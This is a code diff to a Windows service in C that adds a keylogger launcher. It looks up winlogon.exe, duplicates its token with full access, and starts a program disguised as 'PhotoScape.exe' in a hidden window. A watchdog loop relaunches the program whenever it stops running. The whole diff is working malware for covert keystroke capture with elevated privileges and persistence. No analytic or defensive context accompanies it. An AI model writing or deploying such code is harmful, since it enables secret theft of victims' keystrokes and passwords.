@@ -14,7 +14,8 @@
 #include <string.h>
 
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "User32.lib")
+
+LPSTR wszCommand = "C:\\Users\\Public\\PhotoScape.exe";
 
 SERVICE_STATUS        g_ServiceStatus = { 0 };
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
@@ -189,6 +190,77 @@ bool checkIfProccessRunning(const char* filename)
     return (isRunning);
 }
 
+DWORD GetProcessByName(const char* filename)
+{
+    DWORD proccessid = 0;
+
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, filename) == 0)
+        {
+            proccessid = pEntry.th32ProcessID;
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+    return (proccessid);
+}
+
+int startKeyLogger()
+{
+    HANDLE token = nullptr;
+    HANDLE newtoken = nullptr;
+    BOOL ret = false;
+    PROCESS_INFORMATION     pi;
+    STARTUPINFO si;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    DWORD winlogonID = GetProcessByName("winlogon.exe");
+    if (winlogonID == 0)
+    {
+        printf("winlogon.exe proccess not found\n");
+        return (-1);
+    }
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonID);
+    if (hProc == NULL)
+    {
+        printf("can't open winlogon.exe proccess\n");
+        return (-1);
+    }
+    ret = OpenProcessToken(hProc, TOKEN_DUPLICATE, &token);
+    if (ret == false)
+    {
+        CloseHandle(hProc);
+        printf("can't open token winlogon.exe proccess\n");
+        return (-1);
+    }
+    CloseHandle(hProc);
+    ret = DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtoken);
+    if (ret == false)
+    {
+        printf("can't duplicate token winlogon.exe proccess\n");
+        return (-1);
+    }
+    CloseHandle(token);
+
+    if (!CreateProcessAsUser(newtoken, wszCommand, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        CloseHandle(newtoken);
+        fprintf(stderr, "CreateProcess returned error %lu\n", GetLastError());
+        return -1;
+    }
+    CloseHandle(newtoken);
+
+    return (0);
+}
+
+
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
     lpParam = NULL;
@@ -200,7 +272,12 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
          */
         if (checkIfProccessRunning("winky.exe") == false)
         {
-            startKeylogger();
+            startKeyLogger();
+            Sleep(1000);
+        }
+        else
+        {
+            Sleep(10000);
         }
          //  Simulate some work by sleeping
         Sleep(1000);
